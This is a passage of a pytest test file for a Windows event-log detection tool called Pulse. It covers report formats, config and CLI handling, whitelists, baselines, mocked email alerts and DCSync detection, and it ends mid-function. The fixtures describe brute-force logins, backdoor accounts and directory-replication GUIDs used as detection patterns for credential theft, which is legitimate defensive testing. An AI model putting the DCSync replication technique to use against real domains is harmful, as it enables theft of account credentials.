# JSON REPORT TESTS
# ---------------------------------------------------------------------------
# These tests verify that the JSON report builder produces valid, structured
# output that other tools (Splunk, ELK, Python scripts) can consume.

import json
from pulse.reporter import generate_report, RULE_EVENT_IDS


def _make_test_findings():
    """Helper that returns a small list of findings for report tests."""
    return [
        {
            "rule": "Brute Force Attempt",
            "severity": "HIGH",
            "details": (
                "Account 'admin' had 5+ failed login attempts within 10 minutes "
                "(between 2026-04-07T01:00:00 and 01:04:04). "
                "This strongly indicates a password guessing attack."
            ),
        },
        {
            "rule": "User Account Created",
            "severity": "MEDIUM",
            "details": (
                "New account 'backdoor' was created by 'admin' "
                "at 2026-04-07T01:13:00.000000Z. "
                "Verify this was authorized - attackers create backdoor accounts."
            ),
        },
        {
            "rule": "Account Takeover Chain",
            "severity": "CRITICAL",
            "details": (
                "ATTACK CHAIN DETECTED for account 'admin': (5) failed logins "
                "ending at 2026-04-07T01:07:07, followed by a successful login "
                "at 2026-04-07T01:12:00."
            ),
        },
    ]


def test_json_report_is_valid_json(tmp_path):
    """The JSON report must be parseable as valid JSON."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)  # Will raise if invalid JSON

    assert isinstance(data, dict)


def test_json_report_has_top_level_keys(tmp_path):
    """The report must have metadata, summary, and findings sections."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    assert "metadata" in data
    assert "summary" in data
    assert "findings" in data


def test_json_report_metadata_fields(tmp_path):
    """Metadata must include tool name, version, and generation timestamp."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    meta = data["metadata"]
    assert meta["tool"] == "Pulse"
    assert "generated_at" in meta
    assert "version" in meta


def test_json_report_summary_counts(tmp_path):
    """Summary must show correct severity counts and total."""
    output = tmp_path / "test.json"
    findings = _make_test_findings()
    generate_report(findings, output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    summary = data["summary"]
    assert summary["total_findings"] == 3
    assert summary["severity_counts"]["CRITICAL"] == 1
    assert summary["severity_counts"]["HIGH"] == 1
    assert summary["severity_counts"]["MEDIUM"] == 1
    assert summary["severity_counts"]["LOW"] == 0


def test_json_report_security_score(tmp_path):
    """Summary must include the security score and risk level."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    summary = data["summary"]
    assert "security_score" in summary
    assert "risk_level" in summary
    assert isinstance(summary["security_score"], int)


def test_json_report_finding_structure(tmp_path):
    """Each finding must have all required fields."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    required_keys = {"rule_name", "severity", "event_id", "timestamp", "description", "mitre_attack_id"}
    for finding in data["findings"]:
        assert required_keys.issubset(finding.keys())


def test_json_report_extracts_timestamps(tmp_path):
    """Findings with ISO timestamps in details should have them extracted."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    # All three test findings have timestamps in their details.
    for finding in data["findings"]:
        assert finding["timestamp"] is not None
        assert finding["timestamp"].startswith("2026-04-07")


def test_json_report_maps_event_ids(tmp_path):
    """Each finding should have the correct event ID from RULE_EVENT_IDS."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    for finding in data["findings"]:
        expected = RULE_EVENT_IDS.get(finding["rule_name"])
        assert finding["event_id"] == expected


def test_json_report_mitre_field_has_values(tmp_path):
    """MITRE ATT&CK IDs should be populated for known rules."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    for finding in data["findings"]:
        assert finding["mitre_attack_id"] is not None
        assert finding["mitre_attack_id"].startswith("T")


def test_json_report_with_scan_stats(tmp_path):
    """When scan_stats is provided, metadata should include scan details."""
    output = tmp_path / "test.json"
    scan_stats = {
        "total_events": 5000,
        "files_scanned": 2,
        "earliest": "2026-04-06T08:00:00.000000Z",
        "latest": "2026-04-07T23:59:00.000000Z",
        "top_event_ids": [(4625, 3000), (4624, 1500)],
    }
    generate_report(
        _make_test_findings(), output_path=str(output), fmt="json", scan_stats=scan_stats
    )

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    meta = data["metadata"]
    assert meta["total_events"] == 5000
    assert meta["files_scanned"] == 2
    assert meta["time_range"]["earliest"] == "2026-04-06T08:00:00.000000Z"
    assert meta["top_event_ids"]["4625"] == 3000


def test_json_report_sorted_by_severity(tmp_path):
    """Findings should be sorted CRITICAL first, then HIGH, MEDIUM, LOW."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    severities = [f["severity"] for f in data["findings"]]
    assert severities == ["CRITICAL", "HIGH", "MEDIUM"]


# ---------------------------------------------------------------------------
# CONFIG FILE TESTS
# ---------------------------------------------------------------------------
# These tests verify that pulse.yaml config loading works correctly,
# including fallback behavior when the file is missing or invalid.

from main import load_config, build_arg_parser


def test_load_config_returns_dict_from_yaml(tmp_path):
    """A valid YAML config file should return a dictionary."""
    config_file = tmp_path / "pulse.yaml"
    config_file.write_text("logs: my_logs\nformat: html\nseverity: HIGH\n")

    config = load_config(str(config_file))

    assert config["logs"] == "my_logs"
    assert config["format"] == "html"
    assert config["severity"] == "HIGH"


def test_load_config_returns_empty_dict_when_missing(tmp_path):
    """If the config file doesn't exist, return an empty dict (no crash)."""
    config = load_config(str(tmp_path / "nonexistent.yaml"))
    assert config == {}


def test_load_config_returns_empty_dict_on_invalid_yaml(tmp_path):
    """If the YAML file has a syntax error, warn and return empty dict."""
    config_file = tmp_path / "pulse.yaml"
    config_file.write_text("logs: [\ninvalid yaml here\n")

    config = load_config(str(config_file))
    assert config == {}


def test_load_config_handles_empty_file(tmp_path):
    """An empty YAML file should return an empty dict, not None."""
    config_file = tmp_path / "pulse.yaml"
    config_file.write_text("")

    config = load_config(str(config_file))
    assert config == {}


def test_config_overrides_argparse_defaults(tmp_path):
    """Config values should become the new defaults for argparse."""
    config = {"logs": "custom_logs", "format": "json", "severity": "HIGH"}
    parser = build_arg_parser(config)

    # Parse with no CLI args - should use config values.
    args = parser.parse_args([])

    assert args.logs == "custom_logs"
    assert args.format == "json"
    assert args.severity == "HIGH"


def test_cli_args_override_config():
    """CLI flags should always win over config values."""
    config = {"logs": "config_logs", "format": "html", "severity": "LOW"}
    parser = build_arg_parser(config)

    # Pass CLI flags that differ from config.
    args = parser.parse_args(["--logs", "cli_logs", "--format", "txt", "--severity", "CRITICAL"])

    assert args.logs == "cli_logs"
    assert args.format == "txt"
    assert args.severity == "CRITICAL"


def test_config_partial_values():
    """If config only sets some values, the rest use hardcoded defaults."""
    config = {"format": "html"}  # Only sets format, not logs or severity.
    parser = build_arg_parser(config)
    args = parser.parse_args([])

    assert args.format == "html"    # From config
    assert args.logs == "logs"      # Hardcoded default
    assert args.severity == "LOW"   # Hardcoded default
    assert args.output is None      # Hardcoded default


def test_quiet_flag_defaults_false_and_parses():
    """--quiet is off by default and sets args.quiet = True when passed."""
    parser = build_arg_parser({})

    args = parser.parse_args([])
    assert args.quiet is False
    assert args.json_only is False

    args = parser.parse_args(["--quiet"])
    assert args.quiet is True
    assert args.json_only is False


def test_json_only_flag_parses():
    """--json-only should set args.json_only=True (and dest is json_only)."""
    parser = build_arg_parser({})

    args = parser.parse_args(["--json-only"])
    assert args.json_only is True
    # --json-only shouldn't implicitly flip args.quiet at parse time —
    # the implication lives in main() so tests can still distinguish them.
    assert args.quiet is False


def test_json_only_with_empty_logs_emits_valid_json(tmp_path):
    """End-to-end: --json-only against an empty logs folder writes only
    JSON to stdout (no banner), and that JSON parses cleanly."""
    import subprocess
    import sys
    import json as _json
    from pathlib import Path as _Path

    project_root = _Path(__file__).resolve().parent
    empty_logs = tmp_path / "empty_logs"
    empty_logs.mkdir()

    result = subprocess.run(
        [sys.executable, "main.py", "--json-only", "--logs", str(empty_logs)],
        capture_output=True, text=True, cwd=str(project_root), timeout=60,
    )
    assert result.returncode == 0, result.stderr
    parsed = _json.loads(result.stdout.strip())
    assert "findings" in parsed
    assert parsed["findings"] == []
    # Banner should be absent — stdout must be JSON only.
    assert "PULSE" not in result.stdout.split("{", 1)[0]


def test_quiet_with_empty_logs_produces_no_stdout(tmp_path):
    """End-to-end: --quiet against an empty logs folder suppresses the
    banner and the 'No .evtx files' help text."""
    import subprocess
    import sys
    from pathlib import Path as _Path

    project_root = _Path(__file__).resolve().parent
    empty_logs = tmp_path / "empty_logs"
    empty_logs.mkdir()

    result = subprocess.run(
        [sys.executable, "main.py", "--quiet", "--logs", str(empty_logs)],
        capture_output=True, text=True, cwd=str(project_root), timeout=60,
    )
    assert result.returncode == 0, result.stderr
    # Quiet mode should emit nothing on stdout for this no-op path.
    assert result.stdout.strip() == ""


# ---------------------------------------------------------------------------
# WHITELIST TESTS
# ---------------------------------------------------------------------------
# These tests verify that the whitelist filter correctly suppresses
# known-good accounts, services, IPs, and rules from findings.

from main import filter_whitelist


def _make_whitelist_findings():
    """Helper that returns findings with various accounts, services, and IPs."""
    return [
        {
            "rule": "Brute Force Attempt",
            "severity": "HIGH",
            "details": "Account 'svc_backup' had 5+ failed login attempts within 10 minutes.",
        },
        {
            "rule": "Brute Force Attempt",
            "severity": "HIGH",
            "details": "Account 'admin' had 5+ failed login attempts within 10 minutes.",
        },
        {
            "rule": "RDP Logon Detected",
            "severity": "MEDIUM",
            "details": "Remote Desktop logon by 'jsmith' from IP 10.0.0.50.",
        },
        {
            "rule": "Suspicious Service Installed",
            "severity": "MEDIUM",
            "details": "New service 'SuspiciousSvc123' was installed by 'SYSTEM'.",
        },
        {
            "rule": "Audit Log Cleared",
            "severity": "HIGH",
            "details": "Security event log was cleared at 2026-04-07T01:45:00.",
        },
    ]


def test_whitelist_suppresses_accounts():
    """Findings with whitelisted accounts should be removed."""
    whitelist = {"accounts": ["svc_backup"]}
    results = filter_whitelist(_make_whitelist_findings(), whitelist)

    # svc_backup finding removed, admin finding stays.
    assert len(results) == 4
    assert all("svc_backup" not in f["details"] for f in results)


def test_whitelist_suppresses_rules():
    """Findings with whitelisted rule names should be removed."""
    whitelist = {"rules": ["RDP Logon Detected"]}
    results = filter_whitelist(_make_whitelist_findings(), whitelist)

    assert len(results) == 4
    assert all(f["rule"] != "RDP Logon Detected" for f in results)


def test_whitelist_suppresses_services():
    """Findings with whitelisted service names should be removed."""
    whitelist = {"services": ["SuspiciousSvc123"]}
    results = filter_whitelist(_make_whitelist_findings(), whitelist)

    assert len(results) == 4
    assert all("SuspiciousSvc123" not in f["details"] for f in results)


def test_whitelist_suppresses_ips():
    """Findings with whitelisted IPs should be removed."""
    whitelist = {"ips": ["10.0.0.50"]}
    results = filter_whitelist(_make_whitelist_findings(), whitelist)

    assert len(results) == 4
    assert all("10.0.0.50" not in f["details"] for f in results)


def test_whitelist_multiple_categories():
    """Multiple whitelist categories should all apply at once."""
    whitelist = {
        "accounts": ["svc_backup"],
        "rules": ["RDP Logon Detected"],
        "services": ["SuspiciousSvc123"],
    }
    results = filter_whitelist(_make_whitelist_findings(), whitelist)

    # 3 removed: svc_backup account, RDP rule, SuspiciousSvc123 service.
    assert len(results) == 2


def test_whitelist_is_case_insensitive():
    """Account and service matching should be case-insensitive."""
    whitelist = {"accounts": ["SVC_BACKUP"], "services": ["suspicioussvc123"]}
    results = filter_whitelist(_make_whitelist_findings(), whitelist)

    # Both should be matched despite different casing.
    assert len(results) == 3


def test_whitelist_empty_does_nothing():
    """An empty whitelist should not remove any findings."""
    findings = _make_whitelist_findings()
    results = filter_whitelist(findings, {})
    assert len(results) == 5


def test_whitelist_none_does_nothing():
    """A None whitelist should not remove any findings."""
    findings = _make_whitelist_findings()
    results = filter_whitelist(findings, None)
    assert len(results) == 5


# ---------------------------------------------------------------------------
# CSV REPORT TESTS
# ---------------------------------------------------------------------------

import csv as csv_module


def test_csv_report_has_header_row(tmp_path):
    """CSV report must start with a header row."""
    output = tmp_path / "test.csv"
    generate_report(_make_test_findings(), output_path=str(output), fmt="csv")

    with open(output, encoding="utf-8") as f:
        reader = csv_module.reader(f)
        header = next(reader)

    assert header == ["Timestamp", "Event ID", "Severity", "Rule Name", "MITRE ATT&CK", "Description"]


def test_csv_report_has_correct_row_count(tmp_path):
    """CSV should have one row per finding plus the header."""
    output = tmp_path / "test.csv"
    findings = _make_test_findings()
    generate_report(findings, output_path=str(output), fmt="csv")

    with open(output, encoding="utf-8") as f:
        reader = csv_module.reader(f)
        rows = list(reader)

    # 1 header + 3 findings = 4 rows.
    assert len(rows) == 4


def test_csv_report_sorted_by_severity(tmp_path):
    """CSV findings should be sorted CRITICAL first."""
    output = tmp_path / "test.csv"
    generate_report(_make_test_findings(), output_path=str(output), fmt="csv")

    with open(output, encoding="utf-8") as f:
        reader = csv_module.reader(f)
        next(reader)  # skip header
        severities = [row[2] for row in reader]

    assert severities == ["CRITICAL", "HIGH", "MEDIUM"]


def test_csv_report_opens_as_valid_csv(tmp_path):
    """The CSV file must be parseable without errors."""
    output = tmp_path / "test.csv"
    generate_report(_make_test_findings(), output_path=str(output), fmt="csv")

    with open(output, encoding="utf-8") as f:
        reader = csv_module.reader(f)
        rows = list(reader)  # Will raise if CSV is malformed

    assert len(rows) > 0


# ---------------------------------------------------------------------------
# BASELINE TESTS
# ---------------------------------------------------------------------------

from main import build_baseline, save_baseline, load_baseline, compare_baseline


def _make_events_for_baseline():
    """
    Returns fake events covering account creation, service install,
    and scheduled task creation - the three things the baseline tracks.
    """
    return [
        make_user_created_event("alice", "admin", "2024-01-15T08:00:00.000Z"),
        make_user_created_event("bob",   "admin", "2024-01-15T08:01:00.000Z"),
        make_service_installed_event("PrintSpooler", "LocalSystem"),
        make_scheduled_task_event("\\BackupTask", "SYSTEM"),
    ]


def test_build_baseline_extracts_accounts():
    """build_baseline should collect account names from Event 4720."""
    events = _make_events_for_baseline()
    baseline = build_baseline(events)

    assert "alice" in baseline["accounts"]
    assert "bob" in baseline["accounts"]


def test_build_baseline_extracts_services():
    """build_baseline should collect service names from Event 7045."""
    events = _make_events_for_baseline()
    baseline = build_baseline(events)

    assert "printspooler" in baseline["services"]


def test_build_baseline_extracts_tasks():
    """build_baseline should collect task names from Event 4698."""
    events = _make_events_for_baseline()
    baseline = build_baseline(events)

    assert "\\backuptask" in baseline["tasks"]


def test_build_baseline_has_timestamp():
    """Baseline must include a created_at timestamp."""
    baseline = build_baseline([])
    assert "created_at" in baseline


def test_save_and_load_baseline_roundtrip(tmp_path):
    """Saving then loading a baseline should return the same data."""
    events = _make_events_for_baseline()
    path = str(tmp_path / "baseline.json")

    save_baseline(events, path=path)
    loaded = load_baseline(path=path)

    assert loaded is not None
    assert "alice" in loaded["accounts"]
    assert "printspooler" in loaded["services"]


def test_load_baseline_returns_none_when_missing(tmp_path):
    """load_baseline should return None if the file doesn't exist."""
    result = load_baseline(path=str(tmp_path / "nonexistent.json"))
    assert result is None


def test_compare_baseline_flags_new_account():
    """A new account not in the baseline should generate an extra finding."""
    baseline = {"accounts": ["alice"], "services": [], "tasks": []}
    findings = [{
        "rule": "User Account Created",
        "severity": "MEDIUM",
        "details": "New account 'backdoor' was created by 'admin' at 2024-01-15T09:00:00.",
    }]

    result = compare_baseline(findings, baseline)

    rules = [f["rule"] for f in result]
    assert "New Account (Baseline)" in rules


def test_compare_baseline_ignores_known_account():
    """An account already in the baseline should NOT generate an extra finding."""
    baseline = {"accounts": ["alice"], "services": [], "tasks": []}
    findings = [{
        "rule": "User Account Created",
        "severity": "MEDIUM",
        "details": "New account 'alice' was created by 'admin' at 2024-01-15T09:00:00.",
    }]

    result = compare_baseline(findings, baseline)

    rules = [f["rule"] for f in result]
    assert "New Account (Baseline)" not in rules


def test_compare_baseline_flags_new_service():
    """A new service not in the baseline should generate an extra finding."""
    baseline = {"accounts": [], "services": ["spooler"], "tasks": []}
    findings = [{
        "rule": "Service Installed",
        "severity": "MEDIUM",
        "details": "New service 'EvilSvc' was installed by 'SYSTEM' at 2024-01-15T09:00:00.",
    }]

    result = compare_baseline(findings, baseline)

    rules = [f["rule"] for f in result]
    assert "New Service (Baseline)" in rules


def test_compare_baseline_flags_new_task():
    """A new scheduled task not in the baseline should generate an extra finding."""
    baseline = {"accounts": [], "services": [], "tasks": ["\\backuptask"]}
    findings = [{
        "rule": "Scheduled Task Created",
        "severity": "MEDIUM",
        "details": "Scheduled task '\\MalwareTask' was created by 'admin' at 2024-01-15T09:00:00.",
    }]

    result = compare_baseline(findings, baseline)

    rules = [f["rule"] for f in result]
    assert "New Task (Baseline)" in rules


def test_compare_baseline_returns_all_original_findings():
    """compare_baseline should keep all original findings, not just new ones."""
    baseline = {"accounts": ["alice"], "services": [], "tasks": []}
    findings = [
        {"rule": "Audit Log Cleared", "severity": "HIGH",
         "details": "Security event log was cleared at 2024-01-15T09:00:00."},
        {"rule": "User Account Created", "severity": "MEDIUM",
         "details": "New account 'backdoor' was created by 'admin' at 2024-01-15T09:00:00."},
    ]

    result = compare_baseline(findings, baseline)

    # Should have both original findings plus the new baseline finding.
    assert len(result) == 3


# ---------------------------------------------------------------------------
# EMAIL TESTS
# ---------------------------------------------------------------------------
# We can't connect to a real SMTP server in tests, so we use
# unittest.mock to fake the smtplib connection. This lets us verify
# that the emailer calls the right methods without actually sending anything.

from unittest.mock import patch, MagicMock
from pulse.emailer import (
    validate_email_config,
    send_report,
    _build_subject,
    _build_plain_body,
    _build_html_body,
    _context_summary,
    _alert_title,
    _ensure_html_report,
)


VALID_EMAIL_CONFIG = {
    "smtp_host": "smtp.gmail.com",
    "smtp_port": 587,
    "sender": "test@gmail.com",
    "recipient": "soc@company.com",
    "password": "secretpassword",
}


def test_validate_email_config_passes_with_all_fields():
    """A complete config should return None (no error)."""
    assert validate_email_config(VALID_EMAIL_CONFIG) is None


def test_validate_email_config_fails_when_missing_field():
    """A config with a missing field should return an error string."""
    incomplete = {k: v for k, v in VALID_EMAIL_CONFIG.items() if k != "password"}
    error = validate_email_config(incomplete)
    assert error is not None
    assert "password" in error


def test_validate_email_config_fails_when_null_field():
    """A config where a field is None (not set in yaml) should fail."""
    config = {**VALID_EMAIL_CONFIG, "recipient": None}
    error = validate_email_config(config)
    assert error is not None


def test_validate_email_config_fails_with_empty_dict():
    """An empty config dict should return an error."""
    assert validate_email_config({}) is not None


def test_build_subject_critical():
    """Subject should say CRITICAL when critical findings exist."""
    counts = {"CRITICAL": 2, "HIGH": 5, "MEDIUM": 3, "LOW": 1}
    subject = _build_subject(counts, 11)
    assert "CRITICAL" in subject
    assert "11" in subject


def test_build_subject_high():
    """Subject should say HIGH when no critical but high findings exist."""
    counts = {"CRITICAL": 0, "HIGH": 3, "MEDIUM": 1, "LOW": 0}
    subject = _build_subject(counts, 4)
    assert "HIGH" in subject


def test_build_subject_clean():
    """Subject should say no findings when total is zero."""
    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    subject = _build_subject(counts, 0)
    assert "no findings" in subject.lower()


def test_build_plain_body_contains_counts():
    """Plain-text email body should include severity counts and folder note."""
    counts = {"CRITICAL": 1, "HIGH": 2, "MEDIUM": 3, "LOW": 0}
    body = _build_plain_body(counts, 6)
    assert "1" in body   # CRITICAL count
    assert "2" in body   # HIGH count
    assert "reports/" in body


def test_build_html_body_alert_bar_accent_color_critical():
    """Alert bar left border should use red accent for CRITICAL findings."""
    counts = {"CRITICAL": 1, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    html = _build_html_body(counts, 1, [])
    assert "#c0392b" in html


def test_build_html_body_alert_bar_accent_color_green_when_clean():
    """Alert bar left border should use green accent when no findings."""
    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    html = _build_html_body(counts, 0, [])
    assert "#27ae60" in html


def test_build_html_body_alert_bar_title():
    """Alert bar should show the correct severity-level title."""
    counts = {"CRITICAL": 1, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    html = _build_html_body(counts, 1, [])
    assert "Critical severity alert" in html


def test_build_html_body_alert_bar_subtitle():
    """Alert bar subtitle should always be present."""
    html = _build_html_body({"HIGH": 1}, 1, [])
    assert "Pulse detected suspicious activity" in html


def test_build_html_body_metadata_row_shows_findings_count():
    """Metadata row should display the total findings count."""
    html = _build_html_body({"HIGH": 2}, 2, [])
    assert "Findings" in html


def test_build_html_body_renders_finding_rows():
    """HTML body should include rule name and severity badge for each shown finding."""
    counts = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 0, "LOW": 0}
    findings = [
        {"severity": "HIGH", "rule": "Brute Force Login Attempt",
         "description": "10 failed logins for account: admin"}
    ]
    html = _build_html_body(counts, 1, findings)
    assert "Brute Force Login Attempt" in html
    assert "HIGH" in html
    assert "10 failed logins" in html


def test_build_html_body_github_link_present():
    """HTML footer should contain the GitHub link."""
    html = _build_html_body({}, 0, [])
    assert "github.com/barrytd/Pulse" in html


def test_build_html_body_footer_saved_text():
    """Footer should always contain 'Full report saved to'."""
    html = _build_html_body({}, 0, [])
    assert "Full report saved to" in html


def test_build_html_body_footer_shows_report_path(tmp_path):
    """Footer should show the absolute report path when report_url is provided."""
    from pathlib import Path
    report = tmp_path / "report.html"
    report.write_text("<html>test</html>")
    url = Path(report).as_uri()
    html = _build_html_body({"HIGH": 1}, 1, [], report_url=url)
    assert "Full report saved to" in html
    assert "report.html" in html


def test_alert_title_critical():
    """_alert_title should return 'Critical severity alert' for CRITICAL."""
    counts = {"CRITICAL": 1, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    assert _alert_title(counts) == "Critical severity alert"


def test_alert_title_high():
    """_alert_title should return 'High severity alert' when no CRITICAL."""
    counts = {"CRITICAL": 0, "HIGH": 2, "MEDIUM": 0, "LOW": 0}
    assert _alert_title(counts) == "High severity alert"


def test_alert_title_clean():
    """_alert_title should return 'Scan complete' when there are no findings."""
    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    assert _alert_title(counts) == "Scan complete"


def test_context_summary_critical():
    """Context summary should mention immediate investigation for CRITICAL."""
    counts = {"CRITICAL": 1, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    summary = _context_summary(counts)
    assert "Immediate investigation" in summary


def test_context_summary_high():
    """Context summary should mention review for HIGH with no CRITICAL."""
    counts = {"CRITICAL": 0, "HIGH": 2, "MEDIUM": 0, "LOW": 0}
    summary = _context_summary(counts)
    assert "review" in summary.lower()
    assert "Immediate investigation" not in summary


def test_context_summary_low_risk():
    """Context summary should say low-risk for MEDIUM/LOW only."""
    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 3, "LOW": 1}
    summary = _context_summary(counts)
    assert "Low-risk" in summary


def test_html_body_shows_only_top_3_findings():
    """HTML body should show at most 3 findings regardless of total."""
    counts = {"CRITICAL": 0, "HIGH": 5, "MEDIUM": 0, "LOW": 0}
    findings = [
        {"severity": "HIGH", "rule": f"Rule {i}", "description": f"Detail {i}"}
        for i in range(5)
    ]
    html = _build_html_body(counts, 5, findings)
    assert "Rule 0" in html
    assert "Rule 1" in html
    assert "Rule 2" in html
    assert "Rule 3" not in html
    assert "Rule 4" not in html


def test_html_body_shows_overflow_line():
    """HTML body should say '...and X more findings' when list exceeds 3."""
    counts = {"CRITICAL": 0, "HIGH": 5, "MEDIUM": 0, "LOW": 0}
    findings = [
        {"severity": "HIGH", "rule": f"Rule {i}", "description": "detail"}
        for i in range(5)
    ]
    html = _build_html_body(counts, 5, findings)
    assert "2 more findings" in html


def test_html_body_no_overflow_when_three_or_fewer():
    """HTML body should NOT show overflow line when there are 3 or fewer findings."""
    counts = {"CRITICAL": 0, "HIGH": 3, "MEDIUM": 0, "LOW": 0}
    findings = [
        {"severity": "HIGH", "rule": f"Rule {i}", "description": "detail"}
        for i in range(3)
    ]
    html = _build_html_body(counts, 3, findings)
    assert "more findings" not in html


def test_html_body_findings_sorted_by_severity():
    """HTML body should show CRITICAL before LOW regardless of input order."""
    counts = {"CRITICAL": 1, "HIGH": 0, "MEDIUM": 0, "LOW": 1}
    findings = [
        {"severity": "LOW",      "rule": "Low Rule",      "description": "low"},
        {"severity": "CRITICAL", "rule": "Critical Rule",  "description": "crit"},
    ]
    html = _build_html_body(counts, 2, findings)
    assert html.index("Critical Rule") < html.index("Low Rule")


def test_send_report_calls_smtp(tmp_path):
    """send_report should connect to SMTP, log in, and send when config is valid."""
    report = tmp_path / "report.html"
    report.write_text("<html>test</html>")
    counts = {"CRITICAL": 1, "HIGH": 0, "MEDIUM": 0, "LOW": 0}

    # patch replaces smtplib.SMTP with a fake object for this test only.
    # The fake object records what methods were called on it.
    with patch("pulse.emailer.smtplib.SMTP") as mock_smtp:
        mock_server = MagicMock()
        mock_smtp.return_value.__enter__ = MagicMock(return_value=mock_server)
        mock_smtp.return_value.__exit__ = MagicMock(return_value=False)

        result = send_report(VALID_EMAIL_CONFIG, counts, 1, report_path=str(report))

    assert result is True
    mock_server.starttls.assert_called_once()
    mock_server.login.assert_called_once_with("test@gmail.com", "secretpassword")
    mock_server.sendmail.assert_called_once()


def test_send_report_fails_gracefully_on_auth_error(tmp_path):
    """send_report should return False (not crash) on authentication failure."""
    import smtplib as _smtplib

    report = tmp_path / "report.html"
    report.write_text("<html>test</html>")
    counts = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 0, "LOW": 0}

    with patch("pulse.emailer.smtplib.SMTP") as mock_smtp:
        mock_server = MagicMock()
        mock_server.login.side_effect = _smtplib.SMTPAuthenticationError(535, b"Bad credentials")
        mock_smtp.return_value.__enter__ = MagicMock(return_value=mock_server)
        mock_smtp.return_value.__exit__ = MagicMock(return_value=False)

        result = send_report(VALID_EMAIL_CONFIG, counts, 1, report_path=str(report))

    assert result is False


def test_send_report_returns_false_with_invalid_config(tmp_path):
    """send_report should return False immediately if config is incomplete."""
    report = tmp_path / "report.html"
    report.write_text("<html>test</html>")
    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    bad_config = {"smtp_host": "smtp.gmail.com"}  # Missing most fields.
    result = send_report(bad_config, counts, 0, report_path=str(report))
    assert result is False


def test_ensure_html_report_returns_existing_html(tmp_path):
    """_ensure_html_report should return the path as-is if it's already an HTML file."""
    report = tmp_path / "report.html"
    report.write_text("<html>existing</html>")
    result = _ensure_html_report(str(report), [], None)
    assert result == str(report)


def test_ensure_html_report_generates_html_for_txt(tmp_path):
    """_ensure_html_report should generate a companion .html for a .txt report."""
    import os as _os
    report = tmp_path / "report.txt"
    report.write_text("plain text report")
    result = _ensure_html_report(str(report), [], None)
    assert result.endswith(".html")
    assert _os.path.isfile(result)


def test_html_body_no_file_url_link(tmp_path):
    """HTML body should NOT contain a file:// href (stripped by email clients)."""
    from pathlib import Path
    report = tmp_path / "report.html"
    report.write_text("<html>test</html>")
    url = Path(report).as_uri()
    html = _build_html_body({"HIGH": 1}, 1, [], report_url=url)
    assert f'href="{url}"' not in html


# =============================================================================
# DCSync detection tests
# =============================================================================
from pulse.detections import detect_dcsync, detect_suspicious_child_process


def _make_4662_event(subject_user, properties, subject_domain="CORP",
                     timestamp="2026-04-15T10:00:00.000000Z"):
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "<System><EventID>4662</EventID>"
        f'<TimeCreated SystemTime="{timestamp}" /></System>'
        "<EventData>"
        f'<Data Name="SubjectUserName">{subject_user}</Data>'
        f'<Data Name="SubjectDomainName">{subject_domain}</Data>'
        f'<Data Name="Properties">{properties}</Data>'
        "</EventData></Event>"
    )
    return {"event_id": 4662, "timestamp": timestamp, "data": xml}


def test_dcsync_flags_replication_guid():
    """A 4662 with the DS-Replication-Get-Changes GUID from a user account is CRITICAL."""
    events = [_make_4662_event("alice", "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")]
    findings = detect_dcsync(events)
    assert len(findings) == 1
    assert findings[0]["rule"] == "DCSync Attempt"
    assert findings[0]["severity"] == "CRITICAL"
    assert "alice" in findings[0]["details"].lower()


def test_dcsync_flags_any_of_three_replication_guids():
    """All three replication GUIDs should trigger the detection."""
    guids = [
        "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
        "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
        "89e95b76-444d-4c62-991a-0facbeda640c",
    ]
    for guid in guids:
        findings = detect_dcsync([_make_4662_event("attacker", guid)])
        assert len(findings) == 1, f"missed GUID {guid}"


def test_dcsync_ignores_unrelated_guid():
    """A 4662 with an unrelated GUID (e.g. a normal AD read) should be ignored."""
    events = [_make_4662_event("alice", "00000000-0000-0000-0000-000000000000")]
    assert detect_dcsync(events) == []


def test_dcsync_ignores_domain_controller_computer_account():
    """Computer accounts end in '$' and replicate legitimately — don't flag them."""
    events = [_make_4662_event("DC01$", "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")]
    assert detect_dcsync(events) == []


def test_dcsync_dedupes_per_actor():
    """Multiple replication calls from the same account = one finding, not five."""
    guid = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    events = [_make_4662_event("alice", guid) for _ in range(5)]
    assert len(detect_dcsync(events)) == 1


def test_dcsync_ignores_non_4662_events():
